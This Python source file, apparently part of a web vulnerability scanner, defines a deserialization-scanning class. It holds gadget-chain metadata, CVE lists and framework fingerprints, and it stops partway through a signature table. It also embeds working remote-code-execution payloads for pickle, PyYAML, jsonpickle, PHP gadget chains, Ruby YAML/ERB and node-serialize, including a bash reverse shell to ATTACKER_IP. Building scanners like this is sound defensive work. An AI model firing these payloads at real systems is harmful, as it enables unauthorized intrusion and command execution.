"""
Deserialization Scanner - Orchestrator.

Contains the DeserializationScanner class with all orchestration methods.
Format-specific test methods are imported from scanning.modules.deserialization.formats.*
and bound as methods on the class after definition.
"""

from __future__ import annotations

import asyncio
import base64
import hashlib
import json
import re
from typing import TYPE_CHECKING, Any
from urllib.parse import quote, urljoin

import httpx

from scanning.findings import Finding, Severity
from scanning.vuln_scanner import ScanModule
from scanning.scan_context import ScanContext
from utils.scan_client import get_scan_client
from utils.rate_limiter import RateLimiter
from utils.shared_findings_store import SharedFindingsStore

from scanning.modules.deserialization.deser_base import (
    DeserVulnType, GadgetChainType, SerializationFormat,
    DeserTestResult, FrameworkSignature,
    STATIC_EXTENSIONS, SPA_TRIVIAL_ENDPOINTS, GENERIC_ERROR_PATTERNS,
    DESER_SPECIFIC_PATTERNS, SAFE_CONTENT_TYPES, SEVERITY_SIGNAL_REQUIREMENTS,
    logger,
)

if TYPE_CHECKING:
    from core.config_manager import Settings


class DeserializationScanner(ScanModule):
    """
    Enterprise Insecure Deserialization Scanner v2.0.

    Features:
    - Comprehensive ysoserial gadget chain detection (25+ chains)
    - PHP PHPGGC gadget coverage (50+ chains)
    - Python pickle, PyYAML, shelve, jsonpickle vulnerabilities
    - .NET BinaryFormatter, ViewState, Json.NET, ObjectStateFormatter
    - Ruby Marshal, YAML, ERB template injection
    - Node.js node-serialize, cryo, funcster
    - Framework-specific vulnerability detection
    - DNS callback and time-based detection
    - CVE mapping for known vulnerabilities
    - CWE-502 compliance
    """

    name = "deserialization_scanner"

    # ==================== SERIALIZATION MAGIC BYTES ====================

    # Java serialization magic bytes (0xACED0005)
    JAVA_MAGIC = b'\xac\xed\x00\x05'
    JAVA_MAGIC_B64 = "rO0AB"
    JAVA_MAGIC_GZIP = b'\x1f\x8b\x08'  # Gzipped Java objects
    JAVA_XML_START = b'<?xml'
    JAVA_XSTREAM_ROOT = b'<object-stream>'

    # PHP serialized object patterns
    PHP_SERIALIZE_PATTERN = re.compile(
        r'(?:^|[^a-zA-Z0-9])(?:O|C|a|s|i|d|b|N|R|r):\d+(?::|;|{)',
        re.IGNORECASE
    )
    PHP_PHAR_MAGIC = b'__HALT_COMPILER();'
    PHP_PHAR_STUB = b'<?php __HALT_COMPILER(); ?>'

    # Python pickle opcodes
    PICKLE_MAGIC_V0 = b'('  # Protocol 0
    PICKLE_MAGIC_V1 = b']'  # Protocol 1
    PICKLE_MAGIC_V2 = b'\x80\x02'  # Protocol 2
    PICKLE_MAGIC_V3 = b'\x80\x03'  # Protocol 3
    PICKLE_MAGIC_V4 = b'\x80\x04'  # Protocol 4
    PICKLE_MAGIC_V5 = b'\x80\x05'  # Protocol 5

    # .NET serialization headers
    DOTNET_BINARY_MAGIC = b'\x00\x01\x00\x00\x00\xff\xff\xff\xff'
    DOTNET_VIEWSTATE_PREFIX_V1 = b'\xff\x01'
    DOTNET_VIEWSTATE_PREFIX_V2 = b'\xff\xd8'

    # Ruby Marshal
    RUBY_MARSHAL_MAGIC = b'\x04\x08'

    # .NET ViewState patterns
    VIEWSTATE_PATTERN = re.compile(r'__VIEWSTATE[^"]*"[^"]*"')
    VIEWSTATE_GENERATOR_PATTERN = re.compile(r'__VIEWSTATEGENERATOR[^"]*"([^"]*)"')
    VIEWSTATE_MAC_PATTERN = re.compile(r'__VIEWSTATEMAC')

    # ==================== JAVA YSOSERIAL GADGETS ====================

    JAVA_GADGET_PAYLOADS = {
        # URLDNS - Safe DNS callback gadget (no execution)
        GadgetChainType.URLDNS: {
            "description": "DNS lookup - safe detection, no RCE",
            "required_libs": [],
            "cves": [],
            "safe_detection": True,
            "base64": "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAABc3IADGphdmEubmV0LlVSTJYlNzYa/ORyAwAHSQAIaGFzaENvZGVJAARwb3J0TAATYXV0aG9yaXR5dAASTGphdmEvbGFuZy9TdHJpbmc7TAAEZmlsZXEAfgADTAAEaG9zdHEAfgADTAAIcHJvdG9jb2xxAH4AA0wAA3JlZnEAfgADeHD//////////3QAAHQAAHQACWxvY2FsaG9zdHQABGh0dHBweHQAGGh0dHA6Ly9sb2NhbGhvc3QvdGVzdHg=",
        },
        # CommonsCollections variants (1-7)
        GadgetChainType.COMMONS_COLLECTIONS: {
            "description": "Apache Commons Collections gadget chains (CC1-CC7)",
            "variants": ["CC1", "CC2", "CC3", "CC4", "CC5", "CC6", "CC7"],
            "detection_classes": [
                "org.apache.commons.collections.Transformer",
                "org.apache.commons.collections.functors.InvokerTransformer",
                "org.apache.commons.collections.functors.ChainedTransformer",
                "org.apache.commons.collections.functors.ConstantTransformer",
                "org.apache.commons.collections.keyvalue.TiedMapEntry",
                "org.apache.commons.collections4.functors.InvokerTransformer",
                "org.apache.commons.collections4.keyvalue.TiedMapEntry",
                "org.apache.commons.collections.map.LazyMap",
            ],
            "required_libs": ["commons-collections:3.1-3.2.1", "commons-collections4:4.0"],
            "cves": ["CVE-2015-7501", "CVE-2015-4852", "CVE-2017-7525"],
        },
        # CommonsBeanutils
        GadgetChainType.COMMONS_BEANUTILS: {
            "description": "Apache Commons BeanUtils gadget",
            "detection_classes": [
                "org.apache.commons.beanutils.BeanComparator",
                "org.apache.commons.beanutils.PropertyUtils",
            ],
            "required_libs": ["commons-beanutils:1.9.x"],
            "cves": ["CVE-2014-0050"],
        },
        # Spring Framework
        GadgetChainType.SPRING_CORE: {
            "description": "Spring Framework gadget chains",
            "variants": ["Spring1", "Spring2"],
            "detection_classes": [
                "org.springframework.beans.factory.ObjectFactory",
                "org.springframework.transaction.jta.JtaTransactionManager",
                "org.springframework.core.io.support.PathMatchingResourcePatternResolver",
                "org.springframework.aop.framework.JdkDynamicAopProxy",
            ],
            "required_libs": ["spring-core:4.x-5.x", "spring-beans:4.x-5.x"],
            "cves": ["CVE-2016-1000027", "CVE-2017-8046", "CVE-2022-22965"],
        },
        # Hibernate
        GadgetChainType.HIBERNATE_1: {
            "description": "Hibernate ORM gadget chains",
            "detection_classes": [
                "org.hibernate.property.BasicPropertyAccessor",
                "org.hibernate.tuple.component.PojoComponentTuplizer",
                "org.hibernate.engine.spi.TypedValue",
                "org.hibernate.type.Type",
            ],
            "required_libs": ["hibernate-core:4.x-5.x"],
            "cves": [],
        },
        # Groovy
        GadgetChainType.GROOVY_1: {
            "description": "Groovy runtime gadget",
            "detection_classes": [
                "groovy.lang.Closure",
                "org.codehaus.groovy.runtime.MethodClosure",
                "org.codehaus.groovy.runtime.ConvertedClosure",
            ],
            "required_libs": ["groovy:2.x"],
            "cves": [],
        },
        # JBoss
        GadgetChainType.JBOSS: {
            "description": "JBoss/WildFly gadget chains",
            "detection_classes": [
                "org.jboss.interceptor.proxy.InterceptorMethodHandler",
                "org.jboss.weld.interceptor.proxy.InterceptorMethodHandler",
            ],
            "required_libs": ["jboss-interceptor-core"],
            "cves": ["CVE-2015-7501", "CVE-2017-12149"],
        },
        # MyFaces
        GadgetChainType.MYFACES_1: {
            "description": "Apache MyFaces ViewState gadget",
            "detection_classes": [
                "org.apache.myfaces.view.facelets.el.ValueExpressionMethodExpression",
                "org.apache.myfaces.el.CompositeELResolver",
            ],
            "required_libs": ["myfaces-impl:2.x"],
            "cves": ["CVE-2021-26296"],
        },
        # C3P0
        GadgetChainType.C3P0: {
            "description": "C3P0 connection pool gadget",
            "detection_classes": [
                "com.mchange.v2.c3p0.WrapperConnectionPoolDataSource",
                "com.mchange.v2.c3p0.PoolBackedDataSource",
                "com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase",
            ],
            "required_libs": ["c3p0:0.9.x"],
            "cves": [],
        },
        # JRMPClient - RMI callback
        GadgetChainType.JRMPCLIENT: {
            "description": "Java RMI callback gadget",
            "detection_classes": [
                "sun.rmi.server.UnicastRef",
                "java.rmi.server.UnicastRemoteObject",
            ],
            "required_libs": [],
            "cves": ["CVE-2018-2628"],
        },
        # ROME
        GadgetChainType.ROME: {
            "description": "ROME RSS library gadget",
            "detection_classes": [
                "com.sun.syndication.feed.impl.ObjectBean",
                "com.sun.syndication.feed.impl.EqualsBean",
            ],
            "required_libs": ["rome:1.0"],
            "cves": [],
        },
        # AspectJ Weaver
        GadgetChainType.ASPECTJWEAVER: {
            "description": "AspectJ Weaver file write gadget",
            "detection_classes": [
                "org.aspectj.weaver.tools.cache.SimpleCache",
            ],
            "required_libs": ["aspectjweaver:1.x"],
            "cves": [],
        },
        # Vaadin
        GadgetChainType.VAADIN_1: {
            "description": "Vaadin web framework gadget",
            "detection_classes": [
                "com.vaadin.data.util.PropertysetItem",
                "com.vaadin.data.util.NestedMethodProperty",
            ],
            "required_libs": ["vaadin-server:7.x"],
            "cves": [],
        },
        # Click1
        GadgetChainType.CLICK_1: {
            "description": "Apache Click gadget",
            "detection_classes": [
                "org.apache.click.control.Column",
            ],
            "required_libs": ["click-nodeps:2.3.0"],
            "cves": [],
        },
        # BeanShell
        GadgetChainType.BeanShell_1: {
            "description": "BeanShell interpreter gadget",
            "detection_classes": [
                "bsh.XThis",
                "bsh.Interpreter",
            ],
            "required_libs": ["bsh:2.0b5"],
            "cves": [],
        },
        # Clojure
        GadgetChainType.Clojure: {
            "description": "Clojure runtime gadget",
            "detection_classes": [
                "clojure.core$comp$fn__",
                "clojure.main$eval_opt",
            ],
            "required_libs": ["clojure:1.8.0"],
            "cves": [],
        },
        # Jython
        GadgetChainType.JYTHON_1: {
            "description": "Jython Python interpreter gadget",
            "detection_classes": [
                "org.python.core.PyObject",
                "org.python.core.PyFunction",
            ],
            "required_libs": ["jython-standalone:2.5.2"],
            "cves": [],
        },
        # Mozilla Rhino
        GadgetChainType.MOZILLA_RHINO: {
            "description": "Mozilla Rhino JavaScript engine gadget",
            "detection_classes": [
                "org.mozilla.javascript.NativeError",
                "org.mozilla.javascript.NativeObject",
            ],
            "required_libs": ["js:1.7R2"],
            "cves": [],
        },
    }

    # ==================== PHP GADGET CHAINS (PHPGGC) ====================

    PHP_GADGET_PAYLOADS = {
        # Guzzle chains
        GadgetChainType.GUZZLE_FW1: {
            "description": "Guzzle HTTP client file write",
            "classes": [
                "GuzzleHttp\\Cookie\\FileCookieJar",
                "GuzzleHttp\\Cookie\\CookieJar",
            ],
            "version": "6.0.0 <= x <= 6.3.3+7.0.0 <= x <= 7.3.0",
            "payloads": {
                "detect": 'O:29:"GuzzleHttp\\Cookie\\FileCookieJar":4:{s:36:"\\0GuzzleHttp\\Cookie\\CookieJar\\0cookies";a:0:{}s:39:"\\0GuzzleHttp\\Cookie\\CookieJar\\0strictMode";b:0;s:41:"\\0GuzzleHttp\\Cookie\\FileCookieJar\\0filename";s:11:"/tmp/pwned";s:52:"\\0GuzzleHttp\\Cookie\\FileCookieJar\\0storeSessionCookies";b:1;}',
            },
            "cves": [],
        },
        GadgetChainType.GUZZLE_RCE1: {
            "description": "Guzzle RCE via FnStream",
            "classes": [
                "GuzzleHttp\\Psr7\\FnStream",
            ],
            "version": "guzzlehttp/psr7 1.x",
            "cves": [],
        },
        # Monolog chains
        GadgetChainType.MONOLOG_RCE1: {
            "description": "Monolog logging library RCE",
            "classes": [
                "Monolog\\Handler\\SyslogUdpHandler",
                "Monolog\\Handler\\BufferHandler",
            ],
            "version": "1.0.0 <= x <= 1.25.0",
            "payloads": {
                "detect": 'O:32:"Monolog\\Handler\\SyslogUdpHandler":1:{s:9:"\\0*\\0socket";O:29:"Monolog\\Handler\\BufferHandler":7:{s:10:"\\0*\\0handler";N;s:13:"\\0*\\0bufferSize";i:-1;s:9:"\\0*\\0buffer";a:1:{i:0;a:2:{s:5:"level";N;s:7:"message";s:2:"id";}}s:8:"\\0*\\0level";N;s:14:"\\0*\\0initialized";b:1;s:14:"\\0*\\0bufferLimit";i:-1;s:13:"\\0*\\0processors";a:2:{i:0;s:7:"current";i:1;s:6:"system";}}}',
            },
            "cves": [],
        },
        GadgetChainType.MONOLOG_RCE2: {
            "description": "Monolog RCE via StreamHandler",
            "classes": ["Monolog\\Handler\\StreamHandler"],
            "version": "1.0.0 <= x <= 2.0.2",
            "cves": [],
        },
        # Symfony chains
        GadgetChainType.SYMFONY_RCE1: {
            "description": "Symfony framework RCE",
            "classes": [
                "Symfony\\Component\\Cache\\Adapter\\ApcuAdapter",
                "Symfony\\Component\\Cache\\Adapter\\TagAwareAdapter",
            ],
            "version": "3.0.0 <= x <= 3.4.34",
            "payloads": {
                "detect": 'O:40:"Symfony\\Component\\Cache\\Adapter\\ApcuAdapter":0:{}',
            },
            "cves": ["CVE-2019-10911", "CVE-2021-21424"],
        },
        GadgetChainType.SYMFONY_RCE4: {
            "description": "Symfony RCE via Process",
            "classes": ["Symfony\\Component\\Process\\Process"],
            "version": "3.0.0 <= x <= 5.2.3",
            "cves": [],
        },
        GadgetChainType.SYMFONY_FW1: {
            "description": "Symfony file write",
            "classes": ["Symfony\\Component\\Finder\\Finder"],
            "version": "2.x - 5.x",
            "cves": [],
        },
        # Laravel chains
        GadgetChainType.LARAVEL_RCE1: {
            "description": "Laravel framework RCE",
            "classes": [
                "Illuminate\\Broadcasting\\PendingBroadcast",
                "Illuminate\\Bus\\Dispatcher",
            ],
            "version": "5.4.0 <= x <= 5.8.35",
            "payloads": {
                "detect": 'O:40:"Illuminate\\Broadcasting\\PendingBroadcast":2:{s:9:"\\0*\\0events";O:31:"Illuminate\\Bus\\Dispatcher":1:{s:16:"\\0*\\0queueResolver";a:2:{i:0;O:25:"Illuminate\\Bus\\Dispatcher":1:{s:16:"\\0*\\0queueResolver";s:6:"system";}i:1;s:11:"dispatchNow";}}s:8:"\\0*\\0event";s:2:"id";}',
            },
            "cves": ["CVE-2018-15133", "CVE-2021-3129"],
        },
        GadgetChainType.LARAVEL_RCE5: {
            "description": "Laravel RCE via QueueClosureJob",
            "classes": ["Illuminate\\Queue\\CallQueuedClosure"],
            "version": "5.5.0 <= x",
            "cves": [],
        },
        GadgetChainType.LARAVEL_RCE6: {
            "description": "Laravel RCE via Validation",
            "classes": ["Illuminate\\Validation\\ValidationException"],
            "version": "5.6.0 <= x <= 8.x",
            "cves": [],
        },
        # Doctrine chains
        GadgetChainType.DOCTRINE_FW1: {
            "description": "Doctrine ORM file write",
            "classes": [
                "Doctrine\\Common\\Cache\\FileCache",
                "Doctrine\\Common\\Cache\\PhpFileCache",
            ],
            "version": "doctrine/cache < 1.3.2",
            "cves": [],
        },
        GadgetChainType.DOCTRINE_RCE1: {
            "description": "Doctrine RCE via cache",
            "classes": ["Doctrine\\ORM\\Tools\\Export\\ClassMetadataExporter"],
            "version": "2.x",
            "cves": [],
        },
        # WordPress chains
        GadgetChainType.WORDPRESS_RCE1: {
            "description": "WordPress core RCE",
            "classes": [
                "WP_Query",
                "WP_Comment_Query",
            ],
            "version": "5.x",
            "payloads": {
                "detect": 'O:8:"WP_Query":0:{}',
            },
            "cves": ["CVE-2019-8942", "CVE-2021-24867"],
        },
        GadgetChainType.WORDPRESS_P1: {
            "description": "WordPress property-oriented programming",
            "classes": ["PHPMailer\\PHPMailer\\PHPMailer"],
            "version": "5.x with PHPMailer",
            "cves": [],
        },
        # Magento chains
        GadgetChainType.MAGENTO_FW1: {
            "description": "Magento file write",
            "classes": [
                "Credis_Client",
                "Magento\\Framework\\App\\DeploymentConfig",
            ],
            "version": "2.x",
            "payloads": {
                "detect": 'O:13:"Credis_Client":0:{}',
            },
            "cves": ["CVE-2019-8118", "CVE-2021-21389"],
        },
        GadgetChainType.MAGENTO_SQLI: {
            "description": "Magento SQL injection via unserialize",
            "classes": ["Magento\\Framework\\DB\\Adapter\\Pdo\\Mysql"],
            "version": "2.x",
            "cves": ["CVE-2019-7932"],
        },
        # Slim Framework
        GadgetChainType.SLIM_RCE1: {
            "description": "Slim framework RCE",
            "classes": ["Slim\\Http\\Response"],
            "version": "3.8.1",
            "cves": [],
        },
        # Yii Framework
        GadgetChainType.YIIFRAMEWORK_RCE1: {
            "description": "Yii framework RCE",
            "classes": ["yii\\db\\BatchQueryResult"],
            "version": "2.0.x",
            "cves": ["CVE-2020-15148"],
        },
        # CakePHP
        GadgetChainType.CAKEPHP_RCE1: {
            "description": "CakePHP RCE",
            "classes": ["Cake\\ORM\\TableRegistry"],
            "version": "3.x",
            "cves": [],
        },
        # SwiftMailer
        GadgetChainType.SWIFTMAILER_FW1: {
            "description": "SwiftMailer file write",
            "classes": ["Swift_ByteStream_FileByteStream"],
            "version": "5.x - 6.x",
            "cves": [],
        },
        # PHPUnit
        GadgetChainType.PHPUNIT_RCE1: {
            "description": "PHPUnit RCE via eval",
            "classes": ["PHPUnit_Framework_MockObject_Generator"],
            "version": "3.x - 5.x",
            "cves": ["CVE-2017-9841"],
        },
    }

    # ==================== PYTHON DESERIALIZATION ====================

    PYTHON_PAYLOADS = {
        "pickle": {
            "description": "Python pickle module RCE",
            # os.system('id') payload - Protocol 0 (most compatible)
            "rce_exec_v0": base64.b64encode(b"cos\nsystem\n(S'id'\ntR.").decode(),
            # os.system('id') payload - Protocol 4
            "rce_exec_v4": base64.b64encode(
                b'\x80\x04\x95"\x00\x00\x00\x00\x00\x00\x00\x8c\x05posix\x94\x8c\x06system\x94\x93\x94\x8c\x02id\x94\x85\x94R\x94.'
            ).decode(),
            # subprocess.check_output(['id'])
            "rce_subprocess": base64.b64encode(
                b'\x80\x04\x95-\x00\x00\x00\x00\x00\x00\x00\x8c\nsubprocess\x94\x8c\x0ccheck_output\x94\x93\x94]\x94\x8c\x02id\x94a\x85\x94R\x94.'
            ).decode(),
            # eval(__import__('os').system('id'))
            "rce_eval": base64.b64encode(
                b"c__builtin__\neval\n(S'__import__(\"os\").system(\"id\")'\ntR."
            ).decode(),
            # exec(os.popen('id').read()) - bypasses some restrictions
            "rce_exec_bypass": base64.b64encode(
                b"c__builtin__\nexec\n(S'import os;os.popen(\"id\").read()'\ntR."
            ).decode(),
            # Detection payload - creates dict (safe)
            "safe_detect": base64.b64encode(
                b'\x80\x04\x95\x1a\x00\x00\x00\x00\x00\x00\x00\x8c\x08builtins\x94\x8c\x04dict\x94\x93\x94)R\x94.'
            ).decode(),
            "cves": ["CVE-2019-9740", "CVE-2020-10994"],
        },
        "yaml": {
            "description": "PyYAML unsafe load RCE",
            # !!python/object/apply:os.system ['id']
            "rce_basic": "!!python/object/apply:os.system ['id']",
            # Using subprocess
            "rce_subprocess": """!!python/object/new:subprocess.Popen
  args:
    - id
  shell: true""",
            # Check output
            "rce_check_output": "!!python/object/apply:subprocess.check_output [['id']]",
            # Using map with getattr
            "rce_getattr": """!!python/object/new:tuple [!!python/object/new:map [!!python/name:eval, ["__import__('os').system('id')"]]]""",
            # Safe loader bypass attempts
            "rce_bypass_1": "!!python/object/apply:builtins.eval ['__import__(\"os\").system(\"id\")']",
            "rce_bypass_2": "!!python/object/new:bytes [!!python/tuple [!!python/object/apply:os.system ['id']]]",
            "cves": ["CVE-2020-1747", "CVE-2017-18342", "CVE-2020-14343"],
        },
        "shelve": {
            "description": "Python shelve module (uses pickle internally)",
            "note": "shelve uses pickle internally - same payloads apply",
            "cves": [],
        },
        "marshal": {
            "description": "Python marshal module",
            "note": "marshal can execute arbitrary bytecode",
            "cves": [],
        },
        "jsonpickle": {
            "description": "jsonpickle module RCE",
            "rce_payload": '{"py/reduce": [{"py/function": "os.system"}, {"py/tuple": ["id"]}]}',
            "rce_subprocess": '{"py/reduce": [{"py/function": "subprocess.check_output"}, {"py/tuple": [["id"]]}]}',
            "rce_exec": '{"py/reduce": [{"py/function": "builtins.exec"}, {"py/tuple": ["import os; os.system(\'id\')"]}]}',
            "cves": ["CVE-2020-22083"],
        },
    }

    # ==================== .NET DESERIALIZATION ====================

    DOTNET_PAYLOADS = {
        "viewstate": {
            "description": "ASP.NET ViewState deserialization",
            "attack_vectors": [
                "ViewState without MAC",
                "Weak ViewState encryption key",
                "Known machine key exploitation",
                "ViewState encryption oracle",
            ],
            "decryption_indicators": [
                "machineKey",
                "decryptionKey",
                "validationKey",
            ],
            "cves": ["CVE-2020-0688", "CVE-2020-16952", "CVE-2017-9822"],
        },
        "binaryformatter": {
            "description": ".NET BinaryFormatter gadgets",
            "gadgets": {
                GadgetChainType.TYPECONFUSE: "TypeConfuseDelegate - arbitrary getter calls",
                GadgetChainType.ACTIVITYSURROGATE: "ActivitySurrogateSelector - XAML execution",
                GadgetChainType.TEXTFORMATTINGRUNPROPERTIES: "Process start via XAML",
                GadgetChainType.WINDOWSIDENTITY: "WindowsIdentity - claims transformation",
                GadgetChainType.OBJECTDATAPROVIDER: "ObjectDataProvider - method invocation",
                GadgetChainType.WINDOWSPRINCIPAL: "WindowsPrincipal - identity claims RCE",
                GadgetChainType.CLAIMSPRINCIPAL: "ClaimsPrincipal - claims deserialization",
            },
            # TypeConfuseDelegate stub
            "detection_payload": "AAEAAAD/////AQAAAAAAAAAMAgAAAElTeXN0ZW0sIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5",
            "cves": ["CVE-2017-8565", "CVE-2019-0604", "CVE-2020-1147", "CVE-2021-1678"],
        },
        "soapformatter": {
            "description": ".NET SoapFormatter deserialization",
            "xml_marker": "SOAP-ENV:",
            "cves": [],
        },
        "losformatter": {
            "description": ".NET LosFormatter for ViewState",
            "note": "Limited Object Serialization - used for __VIEWSTATE",
            "cves": [],
        },
        "objectstateformatter": {
            "description": ".NET ObjectStateFormatter",
            "note": "More permissive than LosFormatter",
            "cves": [],
        },
        "jsonnet": {
            "description": "Newtonsoft Json.NET TypeNameHandling",
            "dangerous_settings": [
                "TypeNameHandling.All",
                "TypeNameHandling.Auto",
                "TypeNameHandling.Objects",
                "TypeNameHandling.Arrays",
            ],
            "detection_payloads": [
                '{"$type":"System.Windows.Data.ObjectDataProvider, PresentationFramework","MethodName":"Start","ObjectInstance":{"$type":"System.Diagnostics.Process, System"}}',
                '{"$type":"System.IO.FileInfo, mscorlib","fileName":"c:\\\\windows\\\\win.ini"}',
                '{"$type":"System.Data.DataSet, System.Data"}',
            ],
            "cves": ["CVE-2017-8565", "CVE-2019-10782", "CVE-2020-5246"],
        },
        "fastjson": {
            "description": "fastJSON .NET library",
            "cves": [],
        },
        "datacontractserializer": {
            "description": ".NET DataContractSerializer",
            "note": "Can be dangerous with DataContractResolver",
            "cves": [],
        },
        "xmlserializer": {
            "description": ".NET XmlSerializer",
            "note": "Type injection possible with DataContractResolver",
            "cves": [],
        },
    }

    # ==================== RUBY DESERIALIZATION ====================

    RUBY_PAYLOADS = {
        "marshal": {
            "description": "Ruby Marshal.load gadgets",
            # Detection payloads
            "detection_gem_installer": base64.b64encode(b'\x04\x08o:\x10Gem::Installer\x00').decode(),
            "detection_openstruct": base64.b64encode(b'\x04\x08o:\x10OpenStruct\x06:\x0b@tablei\x00').decode(),
            # Gadget classes
            "gadgets": [
                "Gem::Installer",
                "Gem::SpecFetcher",
                "Gem::Requirement",
                "Gem::DependencyList",
                "ERB",
                "Net::BufferedIO",
                "Net::WriteAdapter",
                "OpenStruct",
            ],
            "cves": ["CVE-2013-0156", "CVE-2019-5420", "CVE-2021-31799"],
        },
        "yaml": {
            "description": "Ruby YAML.load gadgets",
            "erb_payload": """--- !ruby/object:Gem::Installer
i: x
--- !ruby/object:Gem::SpecFetcher
i: y
--- !ruby/object:Gem::Requirement
requirements:
  !ruby/object:Gem::Package::TarReader
  io: &1 !ruby/object:Net::BufferedIO
    io: &1 !ruby/object:Gem::Package::TarReader::Entry
       read: 0
       header: "abc"
    debug_output: &1 !ruby/object:Net::WriteAdapter
       socket: &1 !ruby/object:Gem::RequestSet
           sets: !ruby/object:Net::WriteAdapter
               socket: !ruby/module 'Kernel'
               method_id: :system
           git_set: id
       method_id: :resolve""",
            # Simpler payload
            "simple_rce": "--- !ruby/object:Gem::Requirement\nrequirements: !ruby/object:Gem::DependencyList\nspecs:\n- !ruby/object:Gem::Source\n  uri: \"| id\"",
            "cves": ["CVE-2013-0156", "CVE-2021-31799"],
        },
        "erb": {
            "description": "Ruby ERB template injection",
            "payloads": [
                "<%= system('id') %>",
                "<%= `id` %>",
                "<%= IO.popen('id').read %>",
                "<%= %x(id) %>",
                "<%= exec('id') %>",
                "<%= spawn('id') %>",
            ],
        },
        "drb": {
            "description": "Ruby DRb (Distributed Ruby)",
            "note": "Remote method invocation over network",
            "cves": [],
        },
    }

    # ==================== NODE.JS DESERIALIZATION ====================

    NODEJS_PAYLOADS = {
        "node-serialize": {
            "description": "node-serialize IIFE RCE",
            "payloads": {
                # Immediate Function Invocation Expression (IIFE)
                "iife_rce": '{"rce":"_$$ND_FUNC$$_function(){require(\'child_process\').exec(\'id\')}()"}',
                "iife_sync": '{"rce":"_$$ND_FUNC$$_function(){return require(\'child_process\').execSync(\'id\').toString();}()"}',
                # Detection without execution
                "detect": '{"test":"_$$ND_FUNC$$_function(){return 1}()"}',
                # Reverse shell
                "reverse_shell": '{"rce":"_$$ND_FUNC$$_function(){require(\'child_process\').exec(\'bash -c \\"bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1\\"\')}()"}',
            },
            "marker": "_$$ND_FUNC$$_",
            "cves": ["CVE-2017-5941"],
        },
        "cryo": {
            "description": "Cryo library prototype pollution and RCE",
            "payloads": {
                "prototype_pollution": '{"__proto__":{"polluted":"yes"}}',
                "rce": '{"__proto__":{"shellcode":"require(\'child_process\').exec(\'id\')"}}',
            },
            "cves": [],
        },
        "funcster": {
            "description": "Funcster library RCE",
            "payloads": {
                "rce": '{"__js_function":"function(){require(\'child_process\').exec(\'id\')}"}',
            },
            "marker": "__js_function",
            "cves": [],
        },
        "serialize-to-js": {
            "description": "serialize-to-js library RCE",
            "payloads": {
                "rce": '{"_function":"(){require(\'child_process\').exec(\'id\')}"}',
            },
            "marker": "_function",
            "cves": [],
        },
        "safe-obj": {
            "description": "safe-obj prototype pollution",
            "payloads": {
                "pollution": '{"__proto__":{"isAdmin":true}}',
            },
            "cves": [],
        },
    }

    # ==================== FRAMEWORK SIGNATURES ====================

    FRAMEWORK_SIGNATURES = {
        "java_spring": FrameworkSignature(
            name="Spring Framework",
            headers={"X-Application-Context": ""},
            body_patterns=["Whitelabel Error Page", "org.springframework", "Spring Boot"],
            gadget_chains=[GadgetChainType.SPRING_CORE, GadgetChainType.COMMONS_COLLECTIONS],
            cves=["CVE-2016-1000027", "CVE-2022-22965", "CVE-2022-22963"],
        ),
        "java_weblogic": FrameworkSignature(
            name="Oracle WebLogic",
            headers={"X-Powered-By": "Servlet"},
            body_patterns=["WebLogic", "wls_redirect", "Error 404--Not Found"],
            gadget_chains=[GadgetChainType.COMMONS_COLLECTIONS, GadgetChainType.JBOSS],
            cves=["CVE-2015-4852", "CVE-2017-10271", "CVE-2018-2628", "CVE-2019-2725", "CVE-2020-2551"],
        ),
        "java_jboss": FrameworkSignature(
            name="JBoss/WildFly",
            headers={"X-Powered-By": "Undertow"},
            body_patterns=["JBoss", "WildFly", "jboss-eap", "JBoss Application Server"],
            gadget_chains=[GadgetChainType.JBOSS, GadgetChainType.COMMONS_COLLECTIONS],
            cves=["CVE-2015-7501", "CVE-2017-12149"],
        ),
        "java_jenkins": FrameworkSignature(
            name="Jenkins CI",
            headers={"X-Jenkins": "", "X-Hudson": ""},
            body_patterns=["Jenkins", "hudson", "Jenkins CI"],
            gadget_chains=[GadgetChainType.COMMONS_COLLECTIONS],
            cves=["CVE-2015-8103", "CVE-2016-0792", "CVE-2017-1000353", "CVE-2019-17638"],
        ),
        "java_coldfusion": FrameworkSignature(
            name="Adobe ColdFusion",
            cookies=["CFID", "CFTOKEN"],
            body_patterns=["ColdFusion", "coldfusion"],
            gadget_chains=[GadgetChainType.COMMONS_COLLECTIONS],
            cves=["CVE-2017-3066", "CVE-2018-4939"],
        ),
        "php_laravel": FrameworkSignature(
            name="Laravel",
            cookies=["laravel_session", "XSRF-TOKEN"],
            body_patterns=["Laravel", "Illuminate\\", "laravel/framework"],
            gadget_chains=[GadgetChainType.LARAVEL_RCE1, GadgetChainType.MONOLOG_RCE1],
            cves=["CVE-2018-15133", "CVE-2021-3129"],
        ),
        "php_symfony": FrameworkSignature(
            name="Symfony",
            headers={"X-Debug-Token": "", "X-Debug-Token-Link": ""},
            body_patterns=["Symfony", "symfony_", "symfony/framework-bundle"],
            gadget_chains=[GadgetChainType.SYMFONY_RCE1, GadgetChainType.MONOLOG_RCE1],
            cves=["CVE-2019-10911", "CVE-2021-21424"],
        ),
        "php_wordpress": FrameworkSignature(
            name="WordPress",
            cookies=["wordpress_logged_in", "wordpress_test_cookie"],
            body_patterns=["wp-content", "wp-includes", "WordPress", "/wp-json/"],
            gadget_chains=[GadgetChainType.WORDPRESS_RCE1],
            cves=["CVE-2019-8942"],
        ),
        "php_magento": FrameworkSignature(
            name="Magento",
            cookies=["frontend", "adminhtml", "PHPSESSID"],
            body_patterns=["Magento", "Mage.", "varien", "/magento/"],
            gadget_chains=[GadgetChainType.MAGENTO_FW1],
            cves=["CVE-2019-8118", "CVE-2021-21389", "CVE-2022-24086"],
        ),
        "php_drupal": FrameworkSignature(
            name="Drupal",
            headers={"X-Generator": "Drupal"},
            body_patterns=["Drupal", "/sites/default/", "/drupal/"],
            gadget_chains=[GadgetChainType.GUZZLE_FW1, GadgetChainType.MONOLOG_RCE1],
            cves=["CVE-2018-7600", "CVE-2019-6340"],
        ),
        "dotnet_sharepoint": FrameworkSignature(
            name="SharePoint",
            headers={"MicrosoftSharePointTeamServices": ""},
            body_patterns=["SharePoint", "_layouts", "SPWeb", "/_vti_bin/"],
